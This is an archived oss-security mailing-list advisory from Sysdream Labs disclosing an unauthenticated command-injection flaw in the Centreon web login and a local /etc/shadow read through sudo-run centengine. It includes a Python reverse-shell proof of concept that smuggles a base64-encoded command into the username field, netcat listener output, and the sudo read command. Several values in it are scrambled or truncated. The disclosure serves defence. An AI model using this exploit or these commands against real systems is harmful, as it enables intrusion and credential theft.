  oss-security - CVE ID Request : Centreon remote code execution            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 25 Feb From: Sysdream Labs <labs@...dream.com> To: oss-security@...ts.openwall.com Cc: fulldisclosure@...lists.org Subject: CVE ID Request : Centreon remote code execution  Unauthenticated Remote Command Execution in Centreon Web Interface ==================================================================   Description ===========  Centreon is a popular monitoring solution.  A critical vulnerability has been found in the Centreon logging class allowing remote users to execute arbitrary commands.   SQL injection leading to RCE ============================  Centreon logs SQL database errors in a log file using the "echo" system command and the exec() PHP function. On the authentification class, Centreon use htmlentities with the ENT_QUOTES options to filter SQL entities. However, Centreon doesn't filter the SQL escape character "\" and it is possible to generate an SQL Error. Because of the use of the "echo" system command with the PHP exec() function, and because of the lack of sanitization, it is possible to inject arbitrary system commands.  **Access Vector**: remote  **Security Risk**: high  **Vulnerability**: CWE-78  ---------------- Proof of Concept ----------------  TCP Reverse Shell using python.      #!/usr/bin/env python     import requests     import argparse      def shell(target, reverseip, reverseport):         payload = 'import socket as a,subprocess as b,os as % (reverseip,reverseport)         print "[~] Starting reverseshell : %s - port : %d" % (reverseip, reverseport)         req = requests.post(target, data={"useralias": "$(echo %s | base64 -d | python)\\" % payload.encode("base64").replace("\n",""), "password": "foo"})         print "[+] DEAD !"      if __name__ == "__main__":         print "[~] Centreon Unauthentificated RCE - Nicolas Chatelain <n.chatelain@...dream.com>"         parser = argparse.ArgumentParser()         parser.add_argument("--target", required=True)         parser.add_argument("--reverseip", required=True)         parser.add_argument("--reverseport", required=True, type=int)         args = parser.parse_args()         shell(args.target, args.reverseip, args.reverseport)  Shell :      nightlydev@...rkstation ~/Lab/Centreon $ python reverseshell.py --reverseport     [~] Centreon Unauthentificated RCE - Nicolas Chatelain <n.chatelain@...dream.com>     [~] Starting reverseshell : - port :  # Other term  nightlydev@...rkstation ~/Lab/Centreon $ nc -lvp Ncat: Version ( http://nmap.org/ncat ) Ncat: Listening on Ncat: Listening on Ncat: Connection from Ncat: Connection from whoami apache groups apache centreon-engine centreon-broker centreon nagios   --------------- Vulnerable code ---------------  The vulnerable code is located in class/centreonLog.class.php, line 82 and line   		/* 		 * print Error in log file. 		 */ 		exec("echo \"".$string."\" >> ".$this->errorType[$id]);  In class/centreonAuth.class.php, line  	 $DBRESULT = $this->pearDB->query("SELECT * FROM `contact` WHERE `contact_alias` = '" . htmlentities($username, ENT_QUOTES, "UTF-8") . "' AND `contact_activate` = '1' AND 		 `contact_register` = '1' LIMIT 1");   -------- Solution --------  Update to the Centreon   Possible root password disclosure in centengine (Centreon Entreprise Server) ============================================================================  In some configurations, when centengine can run as root (with sudo). It's possible to read some file content.  **Access Vector**: local  **Security Risk**: high  **Vulnerability**:  ---------------- Proof of Concept ----------------      $ sudo /usr/sbin/centengine -v /etc/shadow     reading main config file     error while processing a config file: [/etc/shadow:1] bad variable name:      --------------- Vulnerable code ---------------  In Centreon Entreprise Server (CES) : /etc/sudoers.d/centreon  CENTREON   ALL = NOPASSWD: /usr/sbin/centengine -v *  -------- Solution --------  Do not allow centengine to be run as root or do not disclose the line that caused the error.  Timeline (dd/mm/yyyy) =====================  * : Initial discovery * : Contact with Centreon team * : Centreon correct vulnerabilities * : Centreon release version that fixes vulnerabilities  Fixes =====  * * *  Affected versions =================  * Centreon <=   Credits =======  * Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)   Best regards, --  SYSDREAM Labs <labs@...dream.com>  GPG : C43E 2A2E 8EB4 8CD9 D5B2  * Website: https://sysdream.com/ * Twitter: @sysdream     Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      